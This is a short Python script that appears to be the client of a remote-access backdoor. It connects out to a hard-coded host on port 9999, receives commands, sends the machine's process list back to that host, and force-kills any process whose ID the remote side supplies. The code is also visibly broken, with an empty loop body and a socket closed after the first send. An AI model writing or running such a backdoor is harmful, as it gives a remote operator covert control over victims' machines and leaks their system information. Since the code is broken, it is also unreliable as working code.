import socket
import os
import subprocess

s = socket.socket()
host = '192.168.56.1'
port = 9999

s.connect((host, port))

while True:
    while 1:
    command = s.recv(1024)
    command = command.decode()
    data = s.recv(1024)
    if command == "view_task":
        output = os.popen('wmic process get description, processid').read()
        with open("tasklist.txt", 'w') as h:
            h.write(output)
        with s:
            with open("tasklist.txt", 'rb') as file:
                sendfile = file.read()
            s.sendall(sendfile)



    elif command == "kill_task":
        data = s.recv(1024)
        data = data.decode()
        comm = "taskkill /F /PID " + data
        os.system(comm)

    else:
        print("Command not recognized!")
